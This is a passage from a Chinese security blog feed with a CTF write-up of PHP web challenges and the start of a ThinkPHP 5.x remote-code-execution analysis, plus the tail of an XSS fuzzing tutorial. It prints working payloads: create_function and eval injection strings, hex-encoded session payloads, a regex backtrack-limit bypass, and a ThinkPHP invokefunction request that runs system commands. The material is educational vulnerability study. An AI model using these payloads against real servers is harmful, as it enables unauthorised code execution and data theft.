alt="kzORmj.png"></p><p>这里我们还需要另外一个东西叫<code>PhantomJs</code>，这是下载地址：<a href="http://phantomjs.org/download.html，另外我们需要在xssValidator的github上下载一个小脚本" target="_blank" rel="noopener">http://phantomjs.org/download.html，另外我们需要在xssValidator的github上下载一个小脚本</a></p><p><img src="https://s2.ax1x.com/2019/03/08/kzXKgS.png" alt="kzXKgS.png"></p><p>然后把它放在跟<code>Phantomjs</code>同一级目录下即可，然后利用<code>Phantomjs</code>打开即可，此时开始监听</p><p><img src="https://s2.ax1x.com/2019/03/08/kzXjKg.png" alt="kzXjKg.png"></p><p>这里我以小游戏第一关为例，现在就可以使用bp抓包发送至爆破模块，然后选择插件模式，选择我们的插件</p><p><img src="https://s2.ax1x.com/2019/03/08/kzjQG6.png" alt="kzjQG6.png"></p><p>然后去到该插件的页面复制它的特征码，加载进去字典中</p><p><img src="https://s2.ax1x.com/2019/03/08/kzjUII.png" alt="kzjUII.png"></p><p><img src="https://s2.ax1x.com/2019/03/08/kzjxSK.png" alt="kzjxSK.png"></p><p>点击attack，攻击成功的话会显示，同时监听也会出现报文的回显</p><p><img src="https://s2.ax1x.com/2019/03/08/kzvkFI.png" alt="kzvkFI.png"></p><p><img src="https://s2.ax1x.com/2019/03/08/kzvZSf.png" alt="kzvZSf.png"></p><p>这样去测试就比平常手工测试要便捷多了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在练习xss，感觉这个游戏挺适合新手的，从代码层角度分析更加深刻认识xss的形成，
    
    </summary>
    
      <category term="xss" scheme="0verwatch.top/categories/xss/"/>
    
    
      <category term="xss" scheme="0verwatch.top/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>Code-Breaking-Puzzles学习</title>
    <link href="0verwatch.top/Code-Breaking-Puzzles-Learning.html"/>
    <id>0verwatch.top/Code-Breaking-Puzzles-Learning.html</id>
    <published>2019-02-27T12:48:46.000Z</published>
    <updated>2019-03-04T13:54:41.136Z</updated>
    
    <content type="html"><![CDATA[<p>这波刷题主要以学习为主，复现为主，知识点真的太棒了<a id="more"></a>23333</p><h3 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h3><p>这个题目的点很有意思是关于<code>create_function</code>这个函数的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action(<span class="string">''</span>, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先理解一下代码就是先得绕过一个正则，这个正则只有满足不是字母数字以及下划线才能绕过，才存在一个可控参数的函数调用，但是想不到怎么绕过的话，可以用<code>var_dump</code>函数尝试fuzz一下，可以得到<code>\</code>这个符号是可以绕过的</p><p><img src="https://s2.ax1x.com/2019/02/25/kIZ0GF.png" alt="kIZ0GF.png"></p><p>为什么可以绕过，p神在小密圈中有说过</p><p><img src="https://s2.ax1x.com/2019/02/25/kIZa5T.png" alt="kIZa5T.png"></p><p>也就是一个命名空间的问题，什么是命名空间？可以了解一下<a href="http://php.net/manual/zh/language.namespaces.definition.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.namespaces.definition.php</a></p><p>但是接下来需要一个危险函数，由于PHP7的版本对于危险函数做了很多限制，但还是可以使用<code>create_function</code>这个函数，这个函数第一个参数是新构建函数的参数，第二个参数是代码内容，这个函数的利用点在哪？可以看一下这篇文章<a href="https://blog.51cto.com/lovexm/1743442，本质就是将第一个参数以及第二个参数分别合并而已，可以自己去看一下底层的代码，就是闭合下面这句函数" target="_blank" rel="noopener">https://blog.51cto.com/lovexm/1743442，本质就是将第一个参数以及第二个参数分别合并而已，可以自己去看一下底层的代码，就是闭合下面这句函数</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function __lambda_func ( function_args ) &#123; function_code &#125; \<span class="number">0</span></span><br></pre></td></tr></table></figure><p>所以对于两个参数就有两种闭合方式</p><ol><li>如果可控在第一个参数，需要闭合圆括号和大括号：<code>create_function(&#39;){}phpinfo();//&#39;, &#39;&#39;);</code></li><li>如果可控在第二个参数，需要闭合大括号：<code>create_function(&#39;&#39;, &#39;}phpinfo();//&#39;);</code></li></ol><p>突然觉得字符串拼接极其不安全。。。只要一闭合就可以创造点奇奇怪怪的东西，因为这里面是php7，危险函数不能用了，如果拿到的是webshell，也可以用php的scandir、glob等函数来遍历目录来找flag。</p><p>最后可以构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=\create_function&amp;arg=&#125;var_dump(scandir(%27../%27));//</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=\create_function&amp;arg=&#125;var_dump(file_get_contents(&apos;../flag_h0w2execute_arb1trary_c0de&apos;));//</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/25/kImOgg.png" alt="kImOgg.png"></p><h3 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy-pcrewaf"></a>easy-pcrewaf</h3><p>这个题目是有关正则的一个绕过，详细的原理可以看看p神的这篇文章:<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html。" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html。</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (is_php($data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @mkdir($user_dir, <span class="number">0755</span>);</span><br><span class="line">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span><br><span class="line"></span><br><span class="line">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于这个正则，就是为让PHP代码不能够实现闭合，也就是最后不能出现(`;?&gt;这几个符号，那怎么绕过？p神给出了这样的解释，由于正则有两种匹配模式</p><blockquote><ul><li>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</li><li>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</li></ul></blockquote><p>而php的PCRE库使用的就是NFA的正则引擎，P神的debug过程很详细就不多说什么了。</p><p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），不可能让你一直回溯浪费资源，给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。我们可以通过<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>的方式查看当前环境下的上限(如下图)：</p><p><img src="https://s2.ax1x.com/2019/02/27/kTgHij.png" alt="kTgHij.png"></p><p><img src="https://s2.ax1x.com/2019/02/27/kTgjyV.png" alt="kTgjyV.png"></p><p>所以回溯的上限是1000000，如果超过1000000就会返回false了</p><p><img src="https://s2.ax1x.com/2019/02/27/kT2QfA.png" alt="kT2QfA.png"></p><p>这样答案就很明显了，我们可以用这个特性去绕过，发包即可</p><p><img src="https://s2.ax1x.com/2019/02/27/kTfWtg.png" alt="kTfWtg.png"></p><p><img src="https://s2.ax1x.com/2019/02/27/kTfXh4.png" alt="kTfXh4.png"></p><p>怎么防御？</p><p>可以使用<code>===</code>去防御，因为<code>preg_match</code>这个函数只会返回三个值1或者0或者false，可以看看这句话</p><blockquote><p>returns 1 if the <code>pattern</code><br>matches given <code>subject</code>, 0 if it does not, or <strong>FALSE</strong><br>if an error occurred.</p></blockquote><p><img src="https://s2.ax1x.com/2019/02/27/kThKDP.png" alt="kThKDP.png"></p><p>所以当出现false这种情况的时候，只要<code>===</code>存在就不会存在弱类型的情况，也就是下面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_php($data) === <span class="number">0</span>)&#123; </span><br><span class="line">    write ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="easy-phplimit"><a href="#easy-phplimit" class="headerlink" title="easy - phplimit"></a>easy - phplimit</h3><p>大佬们的骚操作又学习了，题目是下面这个样子的，然后观察一下这个正则，就是只能执行一个函数，但不能设置参数。</p><p>在这篇文章里面有提及<a href="https://lorexxar.cn/2018/05/23/rctf2018/，这篇文章用的是`next(getallheaders())`，通过获取头部信息去实现命令执行，但是这个题目有使用的是Nginx服务器，而且`getallheaders()`这个函数`getallheaders`函数是apache模块的函数，所以得另寻办法。" target="_blank" rel="noopener">https://lorexxar.cn/2018/05/23/rctf2018/，这篇文章用的是`next(getallheaders())`，通过获取头部信息去实现命令执行，但是这个题目有使用的是Nginx服务器，而且`getallheaders()`这个函数`getallheaders`函数是apache模块的函数，所以得另寻办法。</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到大佬们的wp也是惊呆了，都记录一下，</p><h4 id="方法一-利用session-id"><a href="#方法一-利用session-id" class="headerlink" title="方法一:利用session_id"></a>方法一:利用session_id</h4><p>这个函数大的作用下图所示：</p><p><img src="https://s2.ax1x.com/2019/02/26/kodsJS.png" alt="kodsJS.png"></p><p>也就是获取PHPSESSID的内容，这样就可以控制PHPSESSID的内容，从而进行相关的命令执行，但需要注意的是PHPSESSID的内容可能有字符的限制，但是影响不大，所以最好还是转成16进制去操作</p><p><img src="https://s2.ax1x.com/2019/02/26/kowPQH.png" alt="kowPQH.png"></p><p>所以最后的操作是这样的</p><p>GET参数里面的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=eval(hex2bin(session_id(session_start())));</span><br></pre></td></tr></table></figure><p>PHPSESSID里面的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHPSESSID=7072696E745F72287363616E64697228272E2E2F2729293B</span><br><span class="line">#print_r(scandir(&apos;../&apos;));</span><br><span class="line">PHPSESSID=7072696E745F722866696C655F6765745F636F6E74656E747328272E2E2F666C61675F7068706279703473732729293B</span><br><span class="line">#print_r(file_get_contents(&apos;../flag_phpbyp4ss&apos;));</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/kowRpD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/26/kowRpD.md.png" alt="kowRpD.md.png"></a></p><h4 id="方法二-利用get-defined-vars"><a href="#方法二-利用get-defined-vars" class="headerlink" title="方法二:利用get_defined_vars"></a>方法二:利用get_defined_vars</h4><p><img src="https://s2.ax1x.com/2019/02/26/ko0HbR.png" alt="ko0HbR.png"></p><p>这个函数好像在某次的安恒月赛里面出现过，当时也是学习了，但是今天再次碰到，只能怪自己没有灵活运用，导致印象不深，现在再次使用了23333</p><p>既然是返回已定义的数组那么GET数组也肯定包含在里面，那么我们可以直接get传参就可以，然后可以根据<code>current</code>以及<code>next</code>函数去转移到你所需要的参数上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=eval(next(current(get_defined_vars())));&amp;1=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/27/kTVN3F.png" alt="kTVN3F.png"></p><p>另外在php 7.1下，<code>getenv()</code>函数新增了无参数时会获取服务段的env数据，这个时候也可以利用</p><p>还有其他大佬的payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure><p>直接列目录，这里有个函数利用的很巧妙，就是<code>array_reverse</code>，这个函数恰好把数组里面的内容倒转过来，刚好可以使用一次next函数，不然的话调用数组里面的第三个值的话，就要使用多次next就显得冗余了。</p><h3 id="easy-phpmagic"><a href="#easy-phpmagic" class="headerlink" title="easy - phpmagic"></a>easy - phpmagic</h3><p>这个题目是关于写文件的，先把源码拿出来瞅瞅</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'read-source'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line">define(<span class="string">'DATA_DIR'</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"><span class="keyword">if</span>(!is_dir(DATA_DIR)) &#123;</span><br><span class="line">    mkdir(DATA_DIR, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">chdir(DATA_DIR);</span><br><span class="line">$domain = <span class="keyword">isset</span>($_POST[<span class="string">'domain'</span>]) ? $_POST[<span class="string">'domain'</span>] : <span class="string">''</span>;</span><br><span class="line">$log_name = <span class="keyword">isset</span>($_POST[<span class="string">'log'</span>]) ? $_POST[<span class="string">'log'</span>] : date(<span class="string">'-Y-m-d'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST) &amp;&amp; $domain):</span><br><span class="line">                $command = sprintf(<span class="string">"dig -t A -q %s"</span>, escapeshellarg($domain));</span><br><span class="line">                $output = shell_exec($command);</span><br><span class="line">                $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span><br><span class="line">                $log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br><span class="line">                <span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) &#123;</span><br><span class="line">                    file_put_contents($log_name, $output);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">echo</span> $output;</span><br><span class="line"> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析一下，可以看到这里面写文件进去的文件名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br></pre></td></tr></table></figure><p>是由两个部分组成的，第一个部分是<code>$_SERVER[&#39;SERVER_NAME&#39;]</code>，另外一个是可以由用户控制的<code>$log_name</code>，这里涉及的知识点是在第一个参数也是可控的，如果服务器設置了下面的相關參數的话就是可控的，這個可控的參數这个值是可以伪造的。怎么伪造呢？取的是HTTP headers中的<code>Host</code>的值。</p><p><img src="https://s2.ax1x.com/2019/03/04/kO4ySf.png" alt="kO4ySf.png"></p><p>下面的代码就是对写入文件的后缀名过滤，但是这个过滤太容易，因为后面是有关写文件的相关操作，他在底层会做一些操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>))</span><br></pre></td></tr></table></figure><p>这一点在我upload-lab这篇文章里面有提及过，这里只需要用类似<code>index.php/.</code>这样的文件名做绕过</p><p>在观察一下代码中可以写入的内容，可以发现写进去的内容都会经过<code>htmlspecialchars</code>这个函数，那就是说一旦遇到类似<code>&lt;</code>或者<code>&gt;</code>这的操作符，就会转义。</p><p><img src="https://s2.ax1x.com/2019/03/04/kXSFud.png" alt="kXSFud.png"></p><p><img src="https://s2.ax1x.com/2019/03/04/kOzz4K.png" alt="kOzz4K.png"></p><p>这里又涉及到另外的一个知识点了，可以参考一下这一篇文章:<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html，这种类型的题目第一次我好像实在moctf上的一个题目见到的233333" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html，这种类型的题目第一次我好像实在moctf上的一个题目见到的233333</a></p><p>由于是写入文件，可以利用php伪协议去实现多种骚操作，这里就涉及到base64这个问题，因为base64编码在遇到不在其编码集的字符的话会直接跳过，并且解码的时候是4位4位一组，所以这也是为什么下面的payload要凑出四个四个一组。</p><p>还有一个要注意的问题，由于<code>dig</code>接受的参数不允许过长，否则直接返回空，所以payload需要尽可能的短一些，构造payload：</p><p><img src="https://s2.ax1x.com/2019/03/04/kXnCn0.png" alt="kXnCn0.png"></p><p>注意这里使用四个<code>*</code>就是为了不让发送的内容出现<code>=</code>，因为如果出现的话就会导致post参数增加一个，同时也起到了注释的作用，这里视情况将<code>*</code>增加。</p><p><img src="https://s2.ax1x.com/2019/03/04/kXnQHK.png" alt="kXnQHK.png"></p><p>发包测试结果成功</p><p><img src="https://s2.ax1x.com/2019/03/04/kXnJ9H.png" alt="kXnJ9H.png"></p><p><img src="https://s2.ax1x.com/2019/03/04/kXn78J.png" alt="kXn78J.png"></p><p>还有一道PHP题目放在另外一篇文章说说吧。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这波刷题主要以学习为主，复现为主，知识点真的太棒了
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP 5.x RCE分析</title>
    <link href="0verwatch.top/thinkphp-5-rce.html"/>
    <id>0verwatch.top/thinkphp-5-rce.html</id>
    <published>2019-02-15T06:58:27.000Z</published>
    <updated>2019-02-15T06:59:56.368Z</updated>
    
    <content type="html"><![CDATA[<p>第一次进行代码量这么大的分析，记录一下，个人感觉新手真的不适应这种，应该找点小一点的cms去分析，如果不懂MVC架构<a id="more"></a>真的可能会懵。。。</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在分析这个之前还看了两篇tp5的RCE漏洞，这两个洞都是很相似的，都是利用一个可控的变量dispatch去实现到最后还是构造出回调函数，可以学习一下，感觉这里面的思路就是本文分析漏洞的来源</p><p><a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845</a></p><p><a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845</a></p><p>我这里已tp 5.0.22为例子，环境是phpstudy搭建的</p><h3 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h3><p>影响版本<br>THINKPHP 5.0.5-5.0.22</p><p>THINKPHP 5.1.0-5.1.30</p><p>5.0.x补丁地址：<a href="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f</a></p><p><img src="https://s2.ax1x.com/2019/02/15/kDf8x0.png" alt="kDf8x0.png"></p><p>5.1.x补丁地址：<a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815</a></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>补丁中加了正则限制了控制器的自定义初始化</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/tp52/public/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir</span><br></pre></td></tr></table></figure><p>根据补丁下的点，动态跟踪一下是否是因为controller没有做好过滤而实体化，确实是如此</p><p><img src="https://s2.ax1x.com/2019/02/15/kD51Gd.png" alt="kD51Gd.png"></p><p>根据传进去的payload，控制器以及下面的方法都会发生对应的变化，下面就可以分析一下攻击链的流程</p><p>可以从入口文件一级一级跟踪，进入到<code>App.php</code>中，这里应该涉及到一个开发的知识，在<code>App.php</code>中，会根据请求的URL调用<code>routeCheck</code>进行调度解析在<code>App.php</code>中，会根据请求的URL调用<code>routeCheck</code>进行调度解析获得到<code>$dispatch</code>，所以payload是一定要经过那里的，可以在那里加断点进行调试</p><p>定位到<code>/thinkphp/library/think/App.php:116</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$dispatch = <span class="keyword">self</span>::$dispatch;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 未设置调度信息则进行 URL 路由检测</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>($dispatch)) &#123;</span><br><span class="line">                $dispatch = <span class="keyword">self</span>::routeCheck($request, $config);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 记录当前调度信息</span></span><br><span class="line">            $request-&gt;dispatch($dispatch);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">    $data = <span class="keyword">self</span>::exec($dispatch, $config);<span class="comment">//这个函数很关键</span></span><br></pre></td></tr></table></figure><p>继续跟进<code>routeCheck</code>这个函数，同样在App.php里面</p><p><img src="https://s2.ax1x.com/2019/02/15/kDo5K1.png" alt="kDo5K1.png"></p><p>继续跟进到<code>path</code>方法里面，然后这里有一个pathinfo()函数，继续跟进</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">path</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">        $suffix   = Config::get(<span class="string">'url_html_suffix'</span>);</span><br><span class="line">        $pathinfo = <span class="keyword">$this</span>-&gt;pathinfo();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">false</span> === $suffix) &#123;</span><br><span class="line">            <span class="comment">// 禁止伪静态访问</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = $pathinfo;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($suffix) &#123;</span><br><span class="line">            <span class="comment">// 去除正常的URL后缀</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = preg_replace(<span class="string">'/\.('</span> . ltrim($suffix, <span class="string">'.'</span>) . <span class="string">')$/i'</span>, <span class="string">''</span>, $pathinfo);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 允许任何后缀访问</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = preg_replace(<span class="string">'/\.'</span> . <span class="keyword">$this</span>-&gt;ext() . <span class="string">'$/i'</span>, <span class="string">''</span>, $pathinfo);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;path;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Config::get(&#39;var_pathinfo&#39;)</code>是配置文件中的设置的参数，默认值为<code>s</code>，怎么找到这个变量？可以全局搜索一下，可以搜索到其中一个配置文件里面有</p><p><img src="https://s2.ax1x.com/2019/02/15/kDThFS.png" alt="kDThFS.png"></p><p>从GET中获取键值，然后赋值给<code>routeCheck</code>中的<code>$path</code>，这里也就是<code>index/think\app/invokefunction</code>。</p><p><img src="https://s2.ax1x.com/2019/02/15/kDTvYF.png" alt="kDTvYF.png"></p><p>然后开始进入路由检测的部分，经过check的检查后会进入else的分支，但这一部分对于我们需要控制的变量没有任何影响，关键是<code>$result</code>以及<code>$must</code>这两个变量的赋值结果，这也是导致了后面操作的关键，可以进入<code>Route::parseUrl</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">routeCheck</span><span class="params">($request, array $config)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $path   = $request-&gt;path();</span><br><span class="line">        $depr   = $config[<span class="string">'pathinfo_depr'</span>];</span><br><span class="line">        $result = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 路由检测</span></span><br><span class="line">        $check = !is_null(<span 